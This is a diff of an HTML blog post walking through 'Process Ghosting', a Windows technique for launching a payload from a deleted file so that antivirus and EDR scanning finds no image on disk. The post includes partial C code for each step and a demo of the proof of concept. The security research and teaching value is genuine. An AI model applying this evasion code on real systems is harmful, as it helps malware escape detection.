@@ -220,7 +220,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </blockquote>
 <p><img src="https://inspiredbusinessconcepts.com/wp-content/uploads/2022/10/ghosting.jpg" alt=""></p>
 <h2 id="introduction">Introduction</h2>
-<p><code>Process Ghosting</code> is a technique of running payloads from an executable that has already been deleted. On Windows. it is possible to create a file, put it in a delete pending stage, write your payload to it, map it to an image section for it, close the file handle to delete the file, and then finally create a process from the mapped image section. This, essentially, is the <code>Process Ghosting</code> process.  In this way, the created process does not have an associated executable file on disk which makes detection difficult for certain EDRs/AV engines.</p>
+<p><code>Process Ghosting</code> is a technique of running payloads from an executable that has already been deleted. On Windows. it is possible to create a file, put it in a delete pending stage, write your payload to it, map it to an image section for it, close the file handle to delete the file, and then finally create a process from the mapped image section. This, essentially, is the <code>Process Ghosting</code> process.  In this way, the created process does not have an associated executable file on disk which makes detection difficult for certain EDRs/AV engines. As someone who is well experienced in getting ghosted, I try to break down the steps of it (process ghosting - just to be clear) and take a look at some code implementations to achieve this.</p>
+<p>PS: All the code discussed in this blog can be found in a much nicer way in <a href="https://github.com/whokilleddb/ghosted">this github repository</a></p>
 <h2 id="processes-spawned-up-callbacks-get-thrown-up-httpswwwyoutubecomshortsxo5gytho6hi">Processes Spawned Up, Callbacks Get Thrown Up <a href="https://www.youtube.com/shorts/XO5gYTHo6HI">🎵</a></h2>
 <p>An interesting question to ask is how do Security vendors scan processes? One of the methods, <a href="https://www.microsoft.com/en-us/security/blog/2022/06/30/using-process-creation-properties-to-catch-evasion-techniques/">as described by Microsoft in this post</a>, goes as follows:</p>
 <blockquote>
@@ -263,8 +264,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </blockquote>
 <p>Windows provides APIs like <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a> and <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex">PsSetCreateThreadNotifyRoutineEx</a> to receive callbacks upon creation of processes and threads. Security vendors can register callbacks using these functions and monitor processes/threads.</p>
 <p>However, as mentioned before, <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a> callbacks are registered only when the first thread is spawned, therefore there is a delay between the process creation time vs when the security products are notified of it, providing a window to tamper with the executable and the associated section.</p>
-<h2 id="hot-functions-in-your-area">Hot Functions in your Area</h2>
-<p>There are two functions we need to take a look at -   <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtCreateProcess.html">NtCreateProcess</a>.
+<h2 id="hot-functions-in-your-area-im-sorry">Hot Functions in your Area (i&rsquo;m sorry)</h2>
+<p>There are two functions we need to take a look at - <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtCreateProcess.html">NtCreateProcess</a>.
 and <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">PsSetCreateProcessNotifyRoutine</a>.</p>
 <p>The function definition of <code>NtCreateProcess()</code> is as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSYSAPI 
@@ -301,8 +302,9 @@ and <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntdd
 </span></span><span style="display:flex;"><span>  PCUNICODE_STRING    CommandLine;
 </span></span><span style="display:flex;"><span>  NTSTATUS            CreationStatus;
 </span></span><span style="display:flex;"><span>} PS_CREATE_NOTIFY_INFO, <span style="color:#f92672">*</span>PPS_CREATE_NOTIFY_INFO;
-</span></span></code></pre></div><p>Of interest here is the <code>struct _FILE_OBJECT *FileObject</code> field which is a pointer to the file object for the process executable file. Callback functions can use this to scan the executable on disk for malware. But what if the executable has been deleted&hellip;..?</p>
+</span></span></code></pre></div><p>Of interest here is the <code>struct _FILE_OBJECT *FileObject</code> field, which is a pointer to the file object for the process executable file. Callback functions can use this to scan the executable on disk for malware. But what if the executable has been deleted&hellip;..?</p>
 <h2 id="boo-a-ghost">Boo! A Ghost! 👻</h2>
+<p><img src="/blogs/images/process-ghosting/ghost_mw.jpg" alt=""></p>
 <p>Some of the ways to delete a file include:</p>
 <ul>
 <li>Overwrite it by using the <code>FILE_SUPERSEDED</code> flag with <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile">NtCreateFile()</a></li>
@@ -319,7 +321,7 @@ The interesting fact here is that these restrictions come in only when the execu
 </ul>
 <p><img src="/blogs/images/process-ghosting/possible_behaviour.png" alt=""></p>
 <p><code>Process Ghosting</code> follows a similar flow:</p>
-<p><img src="/blogs/images/process-ghosting/pg_flow.png" alt=""></p>
+<p><img src="/blogs/images/process-ghosting/pg_flow.jpg" alt=""></p>
 <h2 id="talk-is-cheap-show-me-the-code">Talk is Cheap, Show me the Code!</h2>
 <p>Time to walk through the code flow for the project! The code is written in C because:</p>
 <ul>
@@ -366,7 +368,7 @@ The interesting fact here is that these restrictions come in only when the execu
 </span></span></code></pre></div><p>This code uses the <code>FILE_DISPOSITION_INFORMATION</code> structure with the <code>DeleteFile</code> field set to <code>TRUE</code>. This deletes the file as soon as the handle to the file is closed.</p>
 <p>If the function is successful, the handle to the open file is returned.</p>
 <h3 id="reading-bytes">Reading Bytes</h3>
-<p>Now, we need to read the bytes from the original payload. These bytes can also be fetched from a remote source like a URL or a TCP Stream (future project idea?). We read the bytes from the file as <code>unsigned char</code> and store them on the heap and return a pointer to it. The main code which does this is as follows:</p>
+<p>Now, we need to read the bytes from the original payload. These bytes can also be fetched from a remote source, like a URL or a TCP Stream (future project idea?). We read the bytes from the file as <code>unsigned char</code> and store them on the heap and return a pointer to it. The main code which does this is as follows:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">read_orig_exe</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> original_exe) {
 </span></span><span style="display:flex;"><span>	DWORD ho_fsz, lo_fsz;
 </span></span><span style="display:flex;"><span>
@@ -398,7 +400,7 @@ The interesting fact here is that these restrictions come in only when the execu
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> hsection;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="getting-entry-point">Getting Entry Point</h3>
-<p><img src="/blogs/images/process-ghosting/header.svg" alt=""></p>
+<p><img src="/blogs/images/process-ghosting/header.jpg" alt=""></p>
 <p>Next up, we map the file bytes to the <code>Portable Executable</code> format and fetch a pointer to an <code>NT Header</code> structure.</p>
 <p>From that, we get the Relative Address of the PE&rsquo;s entrypoint stored in the optional header.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">get_ep_rva</span>(LPVOID <span style="color:#f92672">*</span> base_addr) {
@@ -425,6 +427,8 @@ The interesting fact here is that these restrictions come in only when the execu
 </span></span><span style="display:flex;"><span>} CP_INFO, <span style="color:#f92672">*</span> PCP_INFO;
 </span></span></code></pre></div><p>Once the child process has been created, we can close the handle to the Section object as it is no longer needed.</p>
 <h3 id="assign-process-arguments-and-environment-variables">Assign process arguments and environment variables</h3>
+<p>Okay, fair warning, this section is kinda complicated, so if you wanted to go for a bathroom break or make some coffee, you should do it now. If you want a break and want to watch something other than Family Guy compilations on YT, I really recommend <a href="https://www.youtube.com/watch?v=3N5lgUgAQ-g">this Exurb1a video</a>.</p>
+<p>Once you are done with the existential dread, take a look at the code below:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">set_env</span>(PCP_INFO p_info, LPWSTR w_target_name) {
 </span></span><span style="display:flex;"><span>	LPVOID env, param;
 </span></span><span style="display:flex;"><span>	PEB<span style="color:#f92672">*</span> peb_copy <span style="color:#f92672">=</span> NULL;
@@ -508,39 +512,7 @@ The interesting fact here is that these restrictions come in only when the execu
 <li>They are in continuous memory locations, i.e. one after the other</li>
 <li>They are in non-continuous memory locations</li>
 </ul>
-<p>Before that, check out the <code>RTL_USER_PROCESS_PARAMETERS</code> struct:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _RTL_USER_PROCESS_PARAMETERS {
-</span></span><span style="display:flex;"><span>	ULONG MaximumLength;
-</span></span><span style="display:flex;"><span>	ULONG Length;
-</span></span><span style="display:flex;"><span>	ULONG Flags;
-</span></span><span style="display:flex;"><span>	ULONG DebugFlags;
-</span></span><span style="display:flex;"><span>	PVOID ConsoleHandle;
-</span></span><span style="display:flex;"><span>	ULONG ConsoleFlags;
-</span></span><span style="display:flex;"><span>	HANDLE StandardInput;
-</span></span><span style="display:flex;"><span>	HANDLE StandardOutput;
-</span></span><span style="display:flex;"><span>	HANDLE StandardError;
-</span></span><span style="display:flex;"><span>	CURDIR CurrentDirectory;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING DllPath;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING ImagePathName;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING CommandLine;
-</span></span><span style="display:flex;"><span>	PVOID Environment;
-</span></span><span style="display:flex;"><span>	ULONG StartingX;
-</span></span><span style="display:flex;"><span>	ULONG StartingY;
-</span></span><span style="display:flex;"><span>	ULONG CountX;
-</span></span><span style="display:flex;"><span>	ULONG CountY;
-</span></span><span style="display:flex;"><span>	ULONG CountCharsX;
-</span></span><span style="display:flex;"><span>	ULONG CountCharsY;
-</span></span><span style="display:flex;"><span>	ULONG FillAttribute;
-</span></span><span style="display:flex;"><span>	ULONG WindowFlags;
-</span></span><span style="display:flex;"><span>	ULONG ShowWindowFlags;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING WindowTitle;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING DesktopInfo;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING ShellInfo;
-</span></span><span style="display:flex;"><span>	UNICODE_STRING RuntimeData;
-</span></span><span style="display:flex;"><span>	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span style="color:#ae81ff">0x20</span>];
-</span></span><span style="display:flex;"><span>	ULONG EnvironmentSize;
-</span></span><span style="display:flex;"><span>} RTL_USER_PROCESS_PARAMETERS, <span style="color:#f92672">*</span> PRTL_USER_PROCESS_PARAMETERS;
-</span></span></code></pre></div><p>Now, back to dealing with the memory locations. For the first case, we calculate the total size of the memory region that we need to allocate, to write both the Process Parameters and the Environment block:</p>
+<p>For the first case, we calculate the total size of the memory region that we need to allocate, to write both the Process Parameters and the Environment block:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PVOID buffer <span style="color:#f92672">=</span> proc_params;
 </span></span><span style="display:flex;"><span>ULONG_PTR env_end <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>ULONG_PTR buffer_end <span style="color:#f92672">=</span> (ULONG_PTR)proc_params <span style="color:#f92672">+</span> proc_params<span style="color:#f92672">-&gt;</span>Length;
@@ -586,12 +558,14 @@ The interesting fact here is that these restrictions come in only when the execu
 </span></span><span style="display:flex;"><span>HANDLE hthread <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtCreateThreadEx</span>(<span style="color:#f92672">&amp;</span>hthread, THREAD_ALL_ACCESS, NULL, p_info<span style="color:#f92672">-&gt;</span>p_handle, (LPTHREAD_START_ROUTINE)(proc_entry), NULL, FALSE, NULL, NULL, NULL, NULL);
-</span></span></code></pre></div><p>That should spawn the processes without having an executable disk!</p>
+</span></span></code></pre></div><p>With this, our program is ready to be compiled. I did omit a lot of code segments here for the sake a clarity, but you can take a look at the repository to get a more verbose and rigid version of the code. We can now compile and run it to see it in action!</p>
 <h2 id="demo-time">Demo Time!</h2>
 <p>Remember the demo executable we created at the start of this blog? Lets run it with our now-ready process-ghosting program. We run the program as follows:</p>
 <pre tabindex="0"><code>ghosted.exe Z:\demo.exe .\deleteme.exe
 </code></pre><p><img src="/blogs/images/process-ghosting/PoC_Ghosting.png" alt="Process Ghosting"></p>
-<p>Notice how Process Hacker shows no Image File on disk? This indicates that the process was successfully ghosted and our PoC is working!</p>
+<p>Notice how Process Hacker shows no Image File on disk? This indicates that the process was successfully ghosted, and our PoC is working!</p>
+<p><img src="https://media.tenor.com/eGDdhG6ysmUAAAAC/anakin-it-is-working.gif" alt=""></p>
+<p>That concludes the blog! Feel free to reach out to me over any of my social handles! With that, Ciao my fellow Security Researchers. I hope you all touch some grass and don&rsquo;t get ghosted (irl)! <em>I go to seek the Great Perhaps</em>.</p>
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack">https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack</a></li>
@@ -618,7 +592,7 @@ The interesting fact here is that these restrictions come in only when the execu
     <li><a href="#introduction">Introduction</a></li>
     <li><a href="#processes-spawned-up-callbacks-get-thrown-up-httpswwwyoutubecomshortsxo5gytho6hi">Processes Spawned Up, Callbacks Get Thrown Up <a href="https://www.youtube.com/shorts/XO5gYTHo6HI">🎵</a></a></li>
     <li><a href="#processes-vs-exes">Processes vs Exes</a></li>
-    <li><a href="#hot-functions-in-your-area">Hot Functions in your Area</a></li>
+    <li><a href="#hot-functions-in-your-area-im-sorry">Hot Functions in your Area (i&rsquo;m sorry)</a></li>
     <li><a href="#boo-a-ghost">Boo! A Ghost! 👻</a></li>
     <li><a href="#talk-is-cheap-show-me-the-code">Talk is Cheap, Show me the Code!</a>
       <ul>
